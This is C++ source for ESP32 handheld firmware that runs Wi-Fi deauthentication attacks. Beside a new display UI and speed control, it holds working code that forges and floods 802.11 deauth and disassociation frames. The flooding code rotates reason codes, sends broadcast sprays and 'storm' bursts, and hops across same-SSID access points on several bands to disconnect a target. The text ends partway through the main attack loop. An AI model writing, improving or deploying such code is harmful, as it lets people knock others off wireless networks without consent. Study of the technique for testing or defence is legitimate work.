// deauther.cpp — rewritten UI + speed control
//
// Changes vs original:
//   - All attack screens replaced with drawDeauthScreen() — a proper card-based UI
//     with large readable text, bordered stat boxes, and colour-coded status
//   - Middle/Sel button pauses/resumes all attacks
//   - Up/NextPress → faster (min 1 ms inter-frame delay, tighter burst)
//     Down/PrevPress → slower (max 200 ms inter-frame delay, fewer bursts)
//   - Speed step is 10 ms; displayed in the UI as a slider/bar
//   - scanClientsOnAP UI improved with progress ring
//   - All delay() + tft text-dump replaced — no more CMD-window aesthetic
//   - All existing frame-building / WiFi-state logic untouched

#include "deauther.h"
#include "clients.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/net_utils.h"
#include "core/utils.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wifi_common.h"
#include "modules/wifi/sniffer.h"
#include "scan_hosts.h"
#include "wifi_atks.h"
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <globals.h>
#include <iomanip>
#include <iostream>
#include <lwip/dns.h>
#include <lwip/err.h>
#include <lwip/etharp.h>
#include <lwip/igmp.h>
#include <lwip/inet.h>
#include <lwip/init.h>
#include <lwip/ip_addr.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/netif.h>
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/timeouts.h>
#include <sstream>

// ---------------------------------------------------------------------------
// Frame structs + reason tables — unchanged from original
// ---------------------------------------------------------------------------
struct wifi_header_t {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
} __attribute__((packed));

static const uint8_t DEAUTH_REASONS[]     = {0x01,0x04,0x06,0x07,0x08,0x0A,0x0D,0x0F,0x12,0x28};
static const int     DEAUTH_REASON_COUNT  = sizeof(DEAUTH_REASONS)/sizeof(DEAUTH_REASONS[0]);
static const uint8_t DEAUTH_REASONS_5GHZ[]= {0x30,0x31,0x32,0x33,0x34,0x07,0x08,0x0A,0x0D,0x0F};
static const int     DEAUTH_REASONS_5GHZ_COUNT = sizeof(DEAUTH_REASONS_5GHZ)/sizeof(DEAUTH_REASONS_5GHZ[0]);

struct APInfo {
    uint8_t bssid[6];
    int     channel;
    int     band;
    bool    is_5ghz;
    int     frequency;
};
static std::vector<APInfo> sameSSID_APs;
static std::vector<Host>   detectedClients;
static uint8_t             scanTargetBSSID[6];
static bool                clientScanActive = false;

// ---------------------------------------------------------------------------
// UI constants
// ---------------------------------------------------------------------------
// Speed is expressed as inter-burst delay in ms (lower = faster)
static const int SPEED_MIN  = 1;
static const int SPEED_MAX  = 200;
static const int SPEED_STEP = 10;
static const int SPEED_DEF  = 5; // default: pretty aggressive

// ---------------------------------------------------------------------------
// drawDeauthScreen()
//
//  ┌──────────────────────────────────────────────┐
//  │              DEAUTH ATTACK                   │  ← title bar (highlight)
//  ├──────────────┬───────────────────────────────┤
//  │  ┌────────┐  │  ┌──────────┐  ┌──────────┐  │
//  │  │ STATUS │  │  │ FRAMES   │  │  SPEED   │  │
//  │  │  LIVE  │  │  │  12345   │  │  <<< >>> │  │
//  │  └────────┘  │  └──────────┘  └──────────┘  │
//  │  target info │                               │
//  │  band/ch     │  ┌─────────────────────────┐  │
//  │  mode info   │  │ SPEED BAR               │  │
//  │              │  └─────────────────────────┘  │
//  ├──────────────┴───────────────────────────────┤
//  │  [OK]=Pause/Resume  [▲▼]=Speed  [ESC]=Stop   │
//  └──────────────────────────────────────────────┘
// ---------------------------------------------------------------------------
struct DeauthUIState {
    String  title;       // e.g. "Station Deauth"
    String  targetStr;   // MAC or "Broadcast"
    String  apStr;       // AP BSSID string
    String  bandStr;     // "2.4GHz" / "5GHz" / "6GHz"
    int     channel;
    int     totalFrames;
    int     burstCount;
    int     fps;
    bool    stormActive;
    bool    paused;
    bool    multiBand;
    bool    multiAP;
    int     apCount;
    int     speedMs;     // inter-burst delay in ms (lower = faster)
};

// Helper: draw a labelled box at (x,y) w×h with a value string
static void drawStatBox(int x, int y, int w, int h, const char *label, const String &val, uint16_t valColor) {
    // Box border
    tft.drawRect(x, y, w, h, TFT_DARKGREY);
    // Label — small, top-left inside box
    tft.setTextSize(1);
    tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
    tft.setCursor(x + 4, y + 3);
    tft.print(label);
    // Value — large, centred
    tft.setTextSize(2);
    tft.setTextColor(valColor, bruceConfig.bgColor);
    int valW = val.length() * 2 * 6; // approx
    int valX = x + (w - valW) / 2;
    if (valX < x + 2) valX = x + 2;
    tft.setCursor(valX, y + 14);
    tft.print(val);
}

// Helper: draw a speed bar below the stat boxes
static void drawSpeedBar(int x, int y, int barW, int speedMs) {
    int barH = 10;
    tft.drawRect(x, y, barW, barH, TFT_DARKGREY);
    // fill proportional to how FAST we are (invert: low ms = fast = full bar)
    float frac = 1.0f - (float)(speedMs - SPEED_MIN) / (float)(SPEED_MAX - SPEED_MIN);
    int fill = (int)(frac * (barW - 2));
    if (fill < 0) fill = 0;
    if (fill > barW - 2) fill = barW - 2;
    // colour: green = fast, yellow = mid, red = slow
    uint16_t barCol = (frac > 0.66f) ? TFT_GREEN : (frac > 0.33f) ? TFT_YELLOW : TFT_RED;
    tft.fillRect(x + 1, y + 1, fill, barH - 2, barCol);
    tft.fillRect(x + 1 + fill, y + 1, barW - 2 - fill, barH - 2, bruceConfig.bgColor);
}

static void drawDeauthScreen(const DeauthUIState &ui) {
    int W = tft.width();
    int H = tft.height();

    tft.fillScreen(bruceConfig.bgColor);

    // ---- Title bar ----
    int titleBarH = 20;
    uint16_t titleBg = ui.paused ? TFT_NAVY : (ui.stormActive ? TFT_MAROON : bruceConfig.priColor);
    tft.fillRect(0, 0, W, titleBarH, titleBg);
    tft.setTextSize(2);
    tft.setTextColor(TFT_WHITE, titleBg);
    int titleW = ui.title.length() * 12;
    tft.setCursor((W - titleW) / 2, 4);
    tft.print(ui.title);

    // Pause badge on title bar
    if (ui.paused) {
        tft.setTextSize(1);
        tft.setTextColor(TFT_YELLOW, titleBg);
        tft.setCursor(W - 42, 6);
        tft.print("PAUSED");
    } else if (ui.stormActive) {
        tft.setTextSize(1);
        tft.setTextColor(TFT_YELLOW, titleBg);
        tft.setCursor(W - 36, 6);
        tft.print("STORM");
    }

    int y = titleBarH + 4;

    // ---- Stat boxes row ----
    // Three boxes: STATUS | FRAMES | SPEED
    int boxH  = 34;
    int pad   = 4;
    int boxW3 = (W - pad * 4) / 3;

    int b1x = pad;
    int b2x = pad + boxW3 + pad;
    int b3x = pad + (boxW3 + pad) * 2;

    // Box 1: Status
    String statusStr = ui.paused ? "PAUSED" : (ui.stormActive ? "STORM" : "LIVE");
    uint16_t statusCol = ui.paused ? TFT_YELLOW : (ui.stormActive ? TFT_RED : TFT_GREEN);
    drawStatBox(b1x, y, boxW3, boxH, "STATUS", statusStr, statusCol);

    // Box 2: Frames
    drawStatBox(b2x, y, boxW3, boxH, "FRAMES", String(ui.totalFrames), TFT_CYAN);

    // Box 3: Speed (display delay in ms — lower = faster)
    String speedLabel = String(ui.speedMs) + "ms";
    uint16_t speedCol = (ui.speedMs <= 10) ? TFT_GREEN : (ui.speedMs <= 50) ? TFT_YELLOW : TFT_RED;
    drawStatBox(b3x, y, boxW3, boxH, "DELAY", speedLabel, speedCol);

    y += boxH + 4;

    // ---- Speed bar ----
    drawSpeedBar(pad, y, W - pad * 2, ui.speedMs);
    tft.setTextSize(1);
    tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
    tft.setCursor(pad, y - 9);
    tft.print("FAST");
    tft.setCursor(W - 30, y - 9);
    tft.print("SLOW");

    y += 14 + 4;

    // ---- Target info section ----
    // Thin divider
    tft.drawFastHLine(0, y, W, TFT_DARKGREY);
    y += 3;

    tft.setTextSize(1);
    int lineH = 11;
    int maxChars = (W - 8) / 6;

    auto printInfoLine = [&](const String &label, const String &val, uint16_t col = 0xFFFF) {
        if (y + lineH > H - 20) return; // don't overwrite footer
        tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
        tft.setCursor(4, y);
        tft.print(label);
        tft.setTextColor(col ? col : TFT_WHITE, bruceConfig.bgColor);
        String v = val;
        int avail = maxChars - label.length();
        if (avail < 4) avail = 4;
        if ((int)v.length() > avail) v = v.substring(0, avail - 1) + "~";
        tft.print(v);
        y += lineH;
    };

    printInfoLine("Target: ", ui.targetStr, TFT_CYAN);
    if (ui.apStr.length()) printInfoLine("AP:     ", ui.apStr, TFT_WHITE);
    printInfoLine("Band:   ", ui.bandStr + "  Ch:" + String(ui.channel), TFT_WHITE);
    if (ui.multiAP) printInfoLine("Mesh:   ", String(ui.apCount) + " APs", TFT_MAGENTA);
    if (ui.multiBand) printInfoLine("Mode:   ", "MULTI-BAND", TFT_MAGENTA);

    // FPS if available
    if (ui.fps > 0) {
        printInfoLine("fps:    ", String(ui.fps), TFT_GREEN);
    }

    // ---- Footer ----
    int footerY = H - 16;
    tft.drawFastHLine(0, footerY - 1, W, TFT_DARKGREY);
    tft.setTextSize(1);
    tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
    tft.setCursor(2, footerY + 2);
    tft.print("[OK]Pause [");
    tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
    tft.print("^v");
    tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
    tft.print("]Spd [ESC]Stop");
}

// ---------------------------------------------------------------------------
// drawScanScreen() — used by scanClientsOnAP
// Shows a clean progress ring + client count instead of scrolling text
// ---------------------------------------------------------------------------
static void drawScanScreen(int scanSec, int clientsFound, int maxSec) {
    int W = tft.width();
    int H = tft.height();

    tft.fillScreen(bruceConfig.bgColor);

    // Title
    int titleBarH = 20;
    tft.fillRect(0, 0, W, titleBarH, bruceConfig.priColor);
    tft.setTextSize(2);
    tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
    String t = "SCAN CLIENTS";
    tft.setCursor((W - (int)t.length() * 12) / 2, 4);
    tft.print(t);

    int cx = W / 2;
    int cy = H / 2 - 10;
    int r  = min(W, H) / 4;

    // Progress arc (approximate with rectangle fill)
    // Draw outer ring
    tft.drawCircle(cx, cy, r,     TFT_DARKGREY);
    tft.drawCircle(cx, cy, r - 1, TFT_DARKGREY);

    // Filled arc: scanSec / maxSec fraction (draw filled segments)
    float frac = (float)scanSec / (float)maxSec;
    int   segs = (int)(frac * 36); // 36 segments of 10 degrees
    for (int s = 0; s < segs; s++) {
        float angle = (s * 10 - 90) * 3.14159f / 180.0f;
        int   x1    = cx + (int)((r - 3) * cos(angle));
        int   y1    = cy + (int)((r - 3) * sin(angle));
        tft.drawLine(cx, cy, x1, y1, bruceConfig.priColor);
    }

    // Centre text
    tft.setTextSize(2);
    tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
    String cntStr = String(clientsFound);
    int cntW = cntStr.length() * 12;
    tft.setCursor(cx - cntW / 2, cy - 8);
    tft.print(cntStr);
    tft.setTextSize(1);
    tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
    tft.setCursor(cx - 18, cy + 10);
    tft.print("clients");

    // Time remaining
    int remaining = maxSec - scanSec;
    tft.setTextSize(1);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    String timeStr = String(remaining) + "s left";
    tft.setCursor((W - (int)timeStr.length() * 6) / 2, cy + r + 6);
    tft.print(timeStr);

    // Footer
    int footerY = H - 14;
    tft.drawFastHLine(0, footerY - 1, W, TFT_DARKGREY);
    tft.setTextSize(1);
    tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
    tft.setCursor(2, footerY + 2);
    tft.print("[ESC] Stop early");
}

// ---------------------------------------------------------------------------
// Summary screen drawn after attack stops
// ---------------------------------------------------------------------------
static void drawSummaryScreen(const String &title, int totalFrames, int burstCount,
                               bool is5ghz, bool multiBand, bool wasConnected) {
    int W = tft.width();
    int H = tft.height();

    tft.fillScreen(bruceConfig.bgColor);

    // Title
    tft.fillRect(0, 0, W, 20, TFT_NAVY);
    tft.setTextSize(2);
    tft.setTextColor(TFT_WHITE, TFT_NAVY);
    tft.setCursor((W - (int)title.length() * 12) / 2, 3);
    tft.print(title);

    int y = 28;
    int pad = 8;
    int boxW = (W - pad * 3) / 2;
    int boxH = 36;

    // Frames box
    drawStatBox(pad, y, boxW, boxH, "FRAMES", String(totalFrames), TFT_CYAN);
    // Bursts box
    drawStatBox(pad * 2 + boxW, y, boxW, boxH, "BURSTS", String(burstCount), TFT_GREEN);

    y += boxH + 10;

    tft.setTextSize(1);
    auto printLine = [&](const String &s, uint16_t col) {
        tft.setTextColor(col, bruceConfig.bgColor);
        tft.setCursor(pad, y);
        tft.print(s);
        y += 12;
    };

    printLine("Attack stopped.", TFT_WHITE);
    if (is5ghz)    printLine("5GHz/6GHz mode active.", TFT_YELLOW);
    if (multiBand) printLine("Multi-band attack ran.", TFT_MAGENTA);
    if (wasConnected) printLine("Restoring Wi-Fi...", TFT_DARKGREY);

    // Footer hint
    int footerY = H - 14;
    tft.drawFastHLine(0, footerY - 1, W, TFT_DARKGREY);
    tft.setTextSize(1);
    tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
    tft.setCursor(2, footerY + 2);
    tft.print("Press any key...");
}

// ---------------------------------------------------------------------------
// Vendor OUI Lookup — unchanged
// ---------------------------------------------------------------------------
String getVendorFromMAC(const String &mac) {
    static const std::pair<String, String> oui_list[] = {
        {"00:1A:2B","Apple"},{"00:1E:52","Apple"},{"00:25:00","Apple"},
        {"00:11:22","Samsung"},{"00:23:E7","Samsung"},{"00:24:FE","Samsung"},
        {"00:0C:29","VMware"},{"00:50:56","VMware"},{"00:1C:42","Cisco"},{"00:1A:A0","Cisco"},
        {"00:0F:FE","TP-Link"},{"00:1A:2B","Netgear"},{"00:18:4D","Netgear"},
        {"00:1F:33","Asus"},{"00:0D:88","Microsoft"},{"00:1A:11","Google"},{"00:1A:7D","Google"},
        {"00:0F:52","Intel"},{"00:10:18","Intel"},{"00:04:23","Intel"},
        {"00:0E:58","HP"},{"00:17:A4","HP"},{"00:1F:3A","Dell"},{"00:11:43","Dell"},{"00:1E:C9","Dell"},
        {"00:1A:80","Sony"},{"00:1F:E1","Sony"},
        {"00:1B:FC","Nintendo"},{"00:1F:32","Nintendo"},
        {"00:1C:BE","Roku"},{"00:1E:5E","Amazon"},{"00:1A:22","Amazon"},
        {"00:0F:53","Belkin"},{"00:1D:7E","Belkin"},
        {"00:18:F8","D-Link"},{"00:1B:11","D-Link"},
        {"00:1E:8C","Linksys"},{"00:1A:70","Linksys"}
    };
    String prefix = mac.substring(0, 8);
    for (auto &e : oui_list) if (prefix == e.first) return e.second;
    return "Unknown";
}

// ---------------------------------------------------------------------------
// WiFi state save/restore — unchanged
// ---------------------------------------------------------------------------
WiFiState saveWiFiState() {
    WiFiState state;
    state.was_connected = WiFi.isConnected();
    if (state.was_connected) { state.ssid = WiFi.SSID(); state.bssid = WiFi.BSSIDstr(); state.channel = WiFi.channel(); }
    state.ap_active = WiFi.softAPgetStationNum() > 0 || WiFi.softAPSSID() != "";
    if (state.ap_active) state.ap_ssid = WiFi.softAPSSID();
    state.wifi_mode = WiFi.getMode();
    return state;
}

bool reconnectToWiFi(const String &ssid, const String &bssid) {
    if (ssid.length() == 0) return false;
    String password = bruceConfig.getWifiPassword(ssid);
    if (password == "") return false;
    if (!(WiFi.getMode() & WIFI_MODE_STA)) return false;
    WiFi.begin(ssid, password);
    int attempts = 0;
    while (!WiFi.isConnected() && attempts < 30) { vTaskDelay(200 / portTICK_PERIOD_MS); attempts++; }
    bool connected = WiFi.isConnected();
    if (connected) { wifiConnected = true; wifiIP = WiFi.localIP().toString(); drawStatusBar(); }
    else           { wifiConnected = false; }
    return connected;
}

void restoreWiFiState(const WiFiState &state) {
    WiFi.mode(state.wifi_mode);
    vTaskDelay(pdMS_TO_TICKS(50));
    if (state.was_connected && state.ssid.length() > 0) reconnectToWiFi(state.ssid, state.bssid);
    if (state.ap_active && state.ap_ssid.length() > 0)
        WiFi.softAP(state.ap_ssid.c_str(), bruceConfig.wifiAp.pwd, state.channel, 0, 4, false);
    if (WiFi.isConnected()) { wifiConnected = true; wifiIP = WiFi.localIP().toString(); }
    drawStatusBar();
}

void getGatewayMAC(uint8_t gatewayMAC[6]) {
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) memcpy(gatewayMAC, ap_info.bssid, 6);
}

bool isMACZero(const uint8_t *mac) {
    for (int i = 0; i < 6; i++) if (mac[i] != 0x00) return false;
    return true;
}

bool macCompare(const uint8_t *mac1, const uint8_t *mac2) {
    for (int i = 0; i < 6; i++) if (mac1[i] != mac2[i]) return false;
    return true;
}

int getWiFiBand(int channel) {
    if (channel >= 1  && channel <= 14)  return 0;
    if (channel >= 36 && channel <= 165) return 1;
    if (channel >= 1  && channel <= 233) return 2;
    return 0;
}

void cacheSameSSIDAPs() {
    sameSSID_APs.clear();
    String currentSSID = WiFi.SSID();
    if (currentSSID.length() == 0) return;
    int n = WiFi.scanNetworks(false, false);
    for (int i = 0; i < n; i++) {
        if (WiFi.SSID(i) == currentSSID) {
            APInfo info;
            memcpy(info.bssid, WiFi.BSSID((uint8_t)i), 6);
            info.channel = WiFi.channel((uint8_t)i);
            info.band    = getWiFiBand(info.channel);
            info.is_5ghz = (info.band == 1 || info.band == 2);
            if      (info.band == 1) info.frequency = 5000 + (info.channel - 36) * 20;
            else if (info.band == 2) info.frequency = 6000 + (info.channel - 1)  * 20;
            else                     info.frequency = 2407 + info.channel * 5;
            sameSSID_APs.push_back(info);
        }
    }
    WiFi.scanDelete();
}

const uint8_t *getDeauthReasons(int band, int *count) {
    if (band == 1 || band == 2) { *count = DEAUTH_REASONS_5GHZ_COUNT; return DEAUTH_REASONS_5GHZ; }
    *count = DEAUTH_REASON_COUNT;
    return DEAUTH_REASONS;
}

int getAPChannel(const uint8_t *target_bssid, bool *found) {
    static unsigned long cache_time   = 0;
    static uint8_t cached_bssid[6]   = {0};
    static int     cached_channel    = 0;
    static bool    cached_found      = false;
    if (found) *found = false;
    if (cache_time > 0 && millis() - cache_time < 5000 && macCompare(cached_bssid, target_bssid)) {
        if (found) *found = cached_found;
        return cached_channel;
    }
    int  found_channel = 0;
    bool matched       = false;
    int  numNetworks   = WiFi.scanNetworks(false, false);
    for (int i = 0; i < numNetworks; i++) {
        uint8_t *bssid_ptr = WiFi.BSSID((uint8_t)i);
        if (macCompare(bssid_ptr, target_bssid)) { found_channel = WiFi.channel((uint8_t)i); matched = true; break; }
    }
    WiFi.scanDelete();
    if (found_channel == 0) { found_channel = WiFi.channel(); if (found_channel == 0) found_channel = 1; }
    memcpy(cached_bssid, target_bssid, 6);
    cached_channel = found_channel;
    cached_found   = matched;
    cache_time     = millis();
    if (found) *found = matched;
    return found_channel;
}

void buildOptimizedDeauthFrame(uint8_t *frame, const uint8_t *dest, const uint8_t *src,
                                const uint8_t *bssid, uint8_t reason, bool is_disassoc) {
    frame[0] = is_disassoc ? 0xA0 : 0xC0;
    frame[1] = 0x00; frame[2] = 0x00; frame[3] = 0x00;
    memcpy(&frame[4],  dest,  6);
    memcpy(&frame[10], src,   6);
    memcpy(&frame[16], bssid, 6);
    static uint16_t seq = 0;
    seq = random(0, 4096);
    frame[22] = (seq >> 4) & 0xFF;
    frame[23] = ((seq & 0x0F) << 4);
    frame[24] = reason;
    frame[25] = 0x00;
}

bool initializeDeauthMode(int channel, WiFiState &savedState) {
    String currentSsid = WiFi.SSID();
    savedState = saveWiFiState();
    wifiDisconnect();
    delay(10);
    if (WiFi.getMode() != WIFI_MODE_AP) {
        if (!WiFi.mode(WIFI_MODE_AP)) { displayError("Failed to set AP mode", true); return false; }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (currentSsid.length() == 0) currentSsid = "Wi-Fi_AP";
    int  attempts  = 0;
    bool apStarted = false;
    while (attempts < 5 && !apStarted) { apStarted = WiFi.softAP(currentSsid.c_str(), emptyString, channel, 0, 1, false); if (!apStarted) { delay(100); attempts++; } }
    if (!apStarted) {
        WiFi.disconnect(true); delay(100); WiFi.mode(WIFI_OFF); delay(100); WiFi.mode(WIFI_AP); delay(100);
        apStarted = WiFi.softAP(currentSsid.c_str(), emptyString, channel, 0, 1, false);
    }
    if (!apStarted) { displayError("Failed to start Deauth AP", true); return false; }
    vTaskDelay(50 / portTICK_PERIOD_MS);
    return true;
}

void sendDeauthFrames(const uint8_t *frame, int size) {
    for (int i = 0; i < 3; i++) { wifiRawTx(WIFI_IF_AP, frame, size); vTaskDelay(pdMS_TO_TICKS(1)); }
}

void sendDeauthToAP(APInfo &ap, const uint8_t *targetMAC, int &total_frames) {
    uint8_t da[26], db[26], dc[26], dd[26];
    int rc = 0;
    const uint8_t *reasons = getDeauthReasons(ap.band, &rc);
    uint8_t reason = reasons[random(rc)];
    buildOptimizedDeauthFrame(da, targetMAC, ap.bssid, ap.bssid, reason, false);
    buildOptimizedDeauthFrame(db, targetMAC, ap.bssid, ap.bssid, reason, true);
    buildOptimizedDeauthFrame(dc, ap.bssid, targetMAC, ap.bssid, reason, false);
    buildOptimizedDeauthFrame(dd, ap.bssid, targetMAC, ap.bssid, reason, true);
    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(50 / portTICK_PERIOD_MS);
    sendDeauthFrames(da, 26); sendDeauthFrames(db, 26);
    sendDeauthFrames(dc, 26); sendDeauthFrames(dd, 26);
    total_frames += 12;
}

// ---------------------------------------------------------------------------
// handleSpeedInput() — call every loop iteration; returns true if speed changed
// ---------------------------------------------------------------------------
static bool handleSpeedInput(int &speedMs) {
    bool changed = false;
    if (check(UpPress) || check(NextPress)) {
        speedMs -= SPEED_STEP;
        if (speedMs < SPEED_MIN) speedMs = SPEED_MIN;
        changed = true;
    } else if (check(DownPress) || check(PrevPress)) {
        speedMs += SPEED_STEP;
        if (speedMs > SPEED_MAX) speedMs = SPEED_MAX;
        changed = true;
    }
    return changed;
}

// ---------------------------------------------------------------------------
// stationDeauth() — targeted single-client attack
// ---------------------------------------------------------------------------
void stationDeauth(Host host, const uint8_t *apBssidIn) {
    WiFiState savedState = saveWiFiState();
    bool wasConnected    = savedState.was_connected;

    displayTextLine("Preparing..");

    uint8_t hostMAC[6];
    stringToMAC(host.mac.c_str(), hostMAC);
    if (isMACZero(hostMAC)) { displayError("Invalid MAC address", true); return; }

    uint8_t targetMAC[6], apBSSID[6];
    uint8_t broadcast_mac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    int channel = 0;

    if (apBssidIn != nullptr && !isMACZero(apBssidIn)) {
        memcpy(targetMAC, hostMAC,  6);
        memcpy(apBSSID,   apBssidIn, 6);
        channel = getAPChannel(apBSSID);
    } else {
        bool hostIsAP  = false;
        int  hostChannel = getAPChannel(hostMAC, &hostIsAP);
        if (hostIsAP) {
            memcpy(apBSSID,   hostMAC,      6);
            memcpy(targetMAC, broadcast_mac, 6);
            channel = hostChannel;
        } else {
            uint8_t gw[6] = {0};
            getGatewayMAC(gw);
            if (!isMACZero(gw)) {
                memcpy(apBSSID,   gw,      6);
                memcpy(targetMAC, hostMAC, 6);
                channel = getAPChannel(apBSSID);
            } else {
                memcpy(apBSSID,   hostMAC,      6);
                memcpy(targetMAC, broadcast_mac, 6);
                channel = hostChannel;
            }
        }
    }

    if (channel == 0) { displayError("Could not find target AP", true); return; }

    int  band        = getWiFiBand(channel);
    bool is_5ghz     = (band == 1 || band == 2);
    cacheSameSSIDAPs();
    bool useMultipleAPs  = sameSSID_APs.size() > 1;
    std::vector<APInfo> ap_24ghz, ap_5ghz, ap_6ghz;
    for (auto &ap : sameSSID_APs) {
        switch (ap.band) { case 0: ap_24ghz.push_back(ap); break; case 1: ap_5ghz.push_back(ap); break; case 2: ap_6ghz.push_back(ap); break; }
    }
    bool has_multiple_bands = (ap_24ghz.size() > 0 && ap_5ghz.size() > 0) ||
                              (ap_24ghz.size() > 0 && ap_6ghz.size() > 0) ||
                              (ap_5ghz.size()  > 0 && ap_6ghz.size() > 0);

    if (!initializeDeauthMode(channel, savedState)) { restoreWiFiState(savedState); return; }

    uint8_t da[26], db[26], dc[26], dd[26];
    buildOptimizedDeauthFrame(da, targetMAC, apBSSID, apBSSID, 0x07, false);
    buildOptimizedDeauthFrame(db, targetMAC, apBSSID, apBSSID, 0x07, true);
    buildOptimizedDeauthFrame(dc, apBSSID, targetMAC, apBSSID, 0x07, false);
    buildOptimizedDeauthFrame(dd, apBSSID, targetMAC, apBSSID, 0x07, true);

    String bandStr = (band==1)?"5GHz":(band==2)?"6GHz":"2.4GHz";

    DeauthUIState ui;
    ui.title       = "Station Deauth";
    ui.targetStr   = host.mac;
    ui.apStr       = macToString(apBSSID);
    ui.bandStr     = bandStr;
    ui.channel     = channel;
    ui.totalFrames = 0;
    ui.burstCount  = 0;
    ui.fps         = 0;
    ui.stormActive = false;
    ui.paused      = false;
    ui.multiBand   = has_multiple_bands;
    ui.multiAP     = useMultipleAPs;
    ui.apCount     = (int)sameSSID_APs.size();
    ui.speedMs     = SPEED_DEF;

    drawDeauthScreen(ui);

    SelPress = false; EscPress = false; PrevPress = false; NextPress = false; UpPress = false; DownPress = false;
    delay(100);

    unsigned long tmp           = millis();
    unsigned long lastDraw      = 0;
    int  cont         = 0;
    int  reason_index = 0;
    int  ap_index     = 0;
    bool storm_active = false;
    uint32_t burst_counter      = 0;
    uint8_t  consecutive_failures = 0;

    while (!check(EscPress)) {

        // Pause/resume
        if (check(SelPress)) {
            ui.paused = !ui.paused;
            drawDeauthScreen(ui);
        }

        if (ui.paused) { vTaskDelay(50 / portTICK_PERIOD_MS); continue; }

        // Speed adjustment
        if (handleSpeedInput(ui.speedMs)) {
            // Redraw will happen on next 1-second tick
        }

        if (cont % 20 == 0) {
            int rc = 0;
            const uint8_t *reasons = getDeauthReasons(band, &rc);
            reason_index = (reason_index + 1) % rc;
            uint8_t current_reason = reasons[reason_index];
            buildOptimizedDeauthFrame(da, targetMAC, apBSSID, apBSSID, current_reason, false);
            buildOptimizedDeauthFrame(db, targetMAC, apBSSID, apBSSID, current_reason, true);
            buildOptimizedDeauthFrame(dc, apBSSID, targetMAC, apBSSID, current_reason, false);
            buildOptimizedDeauthFrame(dd, apBSSID, targetMAC, apBSSID, current_reason, true);
        }

        if (useMultipleAPs && has_multiple_bands) {
            int band_cycle = (cont / 4) % 3;
            APInfo *target_ap = nullptr;
            switch (band_cycle) {
                case 0: if (!ap_24ghz.empty()) target_ap = &ap_24ghz[ap_index % ap_24ghz.size()]; break;
                case 1: if (!ap_5ghz.empty())  target_ap = &ap_5ghz[ap_index  % ap_5ghz.size()];  break;
                case 2: if (!ap_6ghz.empty())  target_ap = &ap_6ghz[ap_index  % ap_6ghz.size()];  break;
            }
            if (target_ap != nullptr) {
                sendDeauthToAP(*target_ap, targetMAC, ui.totalFrames);
                ap_index++;
                cont += 12;
                burst_counter++;
            }
        } else if (useMultipleAPs) {
            ap_index = (ap_index + 1) % sameSSID_APs.size();
            APInfo &cur = sameSSID_APs[ap_index];
            esp_wifi_set_channel(cur.channel, WIFI_SECOND_CHAN_NONE);
            vTaskDelay(50 / portTICK_PERIOD_MS);
            int rc = 0;
            const uint8_t *reasons = getDeauthReasons(cur.band, &rc);
            uint8_t r = reasons[random(rc)];
            buildOptimizedDeauthFrame(da, targetMAC, cur.bssid, cur.bssid, r, false);
            buildOptimizedDeauthFrame(db, targetMAC, cur.bssid, cur.bssid, r, true);
            buildOptimizedDeauthFrame(dc, cur.bssid, targetMAC, cur.bssid, r, false);
            buildOptimizedDeauthFrame(dd, cur.bssid, targetMAC, cur.bssid, r, true);
            sendDeauthFrames(da, 26); sendDeauthFrames(db, 26);
            sendDeauthFrames(dc, 26); sendDeauthFrames(dd, 26);
            cont += 12; ui.totalFrames += 12; burst_counter++;
        } else {
            sendDeauthFrames(da, 26); sendDeauthFrames(db, 26);
            sendDeauthFrames(dc, 26); sendDeauthFrames(dd, 26);
            cont += 12; ui.totalFrames += 12; burst_counter++;
        }

        // Broadcast spray every 15 frames
        if (cont % 15 == 0) {
            uint8_t bcast_frame[26];
            int rc = 0;
            const uint8_t *reasons = getDeauthReasons(band, &rc);
            uint8_t br = reasons[random(rc)];
            if (useMultipleAPs && !sameSSID_APs.empty()) {
                APInfo &ca = sameSSID_APs[ap_index % sameSSID_APs.size()];
                buildOptimizedDeauthFrame(bcast_frame, broadcast_mac, ca.bssid, ca.bssid, br, false);
            } else {
                buildOptimizedDeauthFrame(bcast_frame, broadcast_mac, apBSSID, apBSSID, br, false);
            }
            sendDeauthFrames(bcast_frame, 26);
            vTaskDelay(pdMS_TO_TICKS(1));
            ui.totalFrames += 3;
        }

        // Storm burst every 150 frames
        if (cont % 150 == 0) {
            if (burst_counter > 33 && random(100) < 30) storm_active = true;
            int burstN = storm_active ? 10 : 5;
            for (int b = 0; b < burstN; b++) {
                int rc = 0;
                const uint8_t *reasons = getDeauthReasons(band, &rc);
                uint8_t br = reasons[random(rc)];
                sendDeauthFrames(da, 26); sendDeauthFrames(db, 26);
                sendDeauthFrames(dc, 26); sendDeauthFrames(dd, 26);
                ui.totalFrames += 12; burst_counter++;
                vTaskDelay(pdMS_TO_TICKS(1));
            }
            if (storm_active && random(100) < 20) storm_active = false;
        }

        ui.stormActive = storm_active;
        ui.burstCount  = (int)burst_counter;

        // Inter-burst delay — controlled by user speed setting
        int delay_ms = ui.speedMs;
        if (storm_active) delay_ms = max(1, delay_ms / 3);
        delay(delay_ms);

        // Redraw every second
        if (millis() - tmp > 1000) {
            ui.fps  = cont;
            cont    = 0;
            tmp     = millis();
            drawDeauthScreen(ui);
        }
    }

